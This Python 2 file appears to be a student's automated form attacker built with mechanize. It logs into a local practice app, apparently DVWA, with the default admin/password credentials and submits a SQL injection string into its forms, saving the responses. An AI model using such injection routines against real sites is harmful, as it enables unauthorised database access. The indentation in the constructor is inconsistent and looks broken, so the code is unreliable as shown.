#References https://www.pythonforbeginners.com/cheatsheet/python-mechanize-cheat-sheet

import mechanize
import cookielib
import time
import requests

class HTMLGetter():

	def __init__(self):
		self.browser = mechanize.Browser()
		#self.browser.set_all_readonly(False)
		self.browser.set_handle_refresh(False)
                self.cookiejar = cookielib.CookieJar()
                self.browser.set_cookiejar(self.cookiejar)
                self.browser.set_handle_robots(False)
		self.fileName = "myHTML.html"
		self.domain = None
		self.password = "None"
		self.username = "None"

	def setCredentials(self, username, password):
		self.username = username
		self.password = password

	def login(self, url):
		try:
			self.domain = url
			self.browser.open(self.domain)
			self.browser.select_form(nr=0)
			self.browser["username"] = self.username
			self.browser["password"] = self.password
			#self.browser["Login"] = "login"
			response = self.browser.submit()
			with open("login_response.html", "w+") as file:
				file.write(response.read())
				file.close()
			print "Login successful"
		except:
			print "Login failed 2. Try again"
			exit()

	def getHTML(self, url):
		self.domain = url
		try:
			html = self.browser.open(url)
			with open(self.fileName,"w+") as htmlFile:
				htmlFile.write(html.read())
				htmlFile.close()
		except:
			None
		#time.sleep(5)
	def getFileName(self):
		return self.fileName

	def getForms(self, url):
		self.domain = url
		self.browser.open(url)
		for form in self.browser.forms():
			print "Form name: ", form.name

# Method taken almost directly from https://www.pythonforbeginners.com/cheatsheet/python-mechanize-cheat-sheet
	def mechforms(self, url):
		#method =
		try:
			self.browser.open(url)
			count = 0
			for form in self.browser.forms():
				print "Form ", count + 1
				#print "Form name: ", form.name
				#print form
				self.browser.form = list(self.browser.forms())[count]
				for control in self.browser.form.controls:
					if control.type == "submit":
						control.disabled = True
						#print "disabled"
				#for control in self.browser.form.controls:
					#print control
				#	print "type=%s, name=%s value=%s" % (control.type, control.name, self.browser[control.name])
				#	if control.type == "text":  # means it's class ClientForm.TextControl
				#		control.value = "\'SELECT * FROM Users WHERE UserId = 105 OR 1=1;\'"
				#for control in self.browser.form.controls:
				#	print control.value
				for control in self.browser.form.controls:
					inputname = str(control.name)
					self.browser.select_form(nr=count)
					if not control.disabled:
						#control.readonly = False
						self.browser[inputname] = "3"
						#self.browser[inputname] = "\'SELECT * FROM Users WHERE UserId = 105 OR 1=1;\'"
					print inputname
					print str(self.browser[inputname])
				self.browser.submit()
				fullUrl = self.browser.geturl()
				fullUrl = fullUrl + "&Submit=Submit"
				print fullUrl
				response = self.browser.open(fullUrl)
				with open("attack_response.html", "w+") as htmlFile:
					htmlFile.write(response.read())
					htmlFile.close()
				#self.browser.back()
				count = count + 1
		except:
			print "Form failed"
			exit()

	def mechforms2(self, url):
		#data = {"id": "1"}
		request = mechanize.Request("http://192.168.56.101/vulnerabilities/sqli/?id=%27SELECT+*+FROM+Users+WHERE+UserId+"
									"=+105+OR+1=1;%27&Submit=Submit", method="GET")
		try:
			self.browser.open(url)
			#self.browser.open(self.domain)
			self.browser.select_form(nr=0)
			self.browser["id"] = "\'SELECT * FROM Users WHERE UserId = 105 OR 1=1;\'"
			#self.browser["id"] = "3"
			#self.browser["Submit"] = "Submit"
			self.browser.submit()
			fullUrl = self.browser.geturl()
			print fullUrl
			response = self.browser.open(fullUrl)
			print self.browser.geturl()
			#response = self.browser.open("http://192.168.56.101/vulnerabilities/sqli/?id=%27SELECT+*+FROM+Users+WHERE+UserId+=+105+OR+1=1;%27&Submit=Submit")
			#response = self.browser.open("http://192.168.56.101/vulnerabilities/sqli/?id=\'SELECT+*+FROM+Users+WHERE+UserId+=+105+OR+1=1;\'&Submit=Submit")
			#print self.browser.geturl()
			#print response.read()
			#print fullUrl
			with open("attack_response.html", "w+") as f:
				f.write(response.read())
				f.close()
		except:
			print "Form failed"
			exit()

	def getForm(self, url):
		payload = {
			'username': 'admin',
			'password': 'password'
		}
		with requests.Session() as session:
			post = session.post('http://192.168.56.101/login.php', data=payload)
			print post.content
			#print "\n", url, "\n"
			request = session.get("http://192.168.56.101/index.php")
			print request.text
			#fullRequest = url + "?id=\'SELECT * FROM Users WHERE UserId = 105 OR 1=1;\'&Submit=Submit"
			#res = requests.get(fullRequest)
			#print res.content
